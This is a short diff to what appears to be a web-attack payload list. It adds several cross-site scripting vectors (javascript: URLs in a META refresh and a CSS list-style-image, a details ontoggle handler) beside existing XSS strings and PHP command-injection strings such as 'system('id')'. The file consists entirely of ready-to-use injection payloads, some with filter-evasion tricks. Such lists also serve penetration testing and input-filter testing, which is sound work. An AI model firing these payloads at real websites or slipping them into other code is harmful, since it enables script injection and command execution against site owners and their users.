@@ -1,5 +1,9 @@
 "/><?php system('id')?> '\\'\'\system(\'\id\'\); ;system('id')<img src=xss onerror=alert(1)><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
-PL"><svg/onload=alert("XSS")><" 
+PL"><svg/onload=alert("XSS")><"
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+">'><details/open/ontoggle=confirm('XSS')>
 "><svg onload=(alert)(1)>
 ”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>
  "><svg/onload=alert(document.domain)>
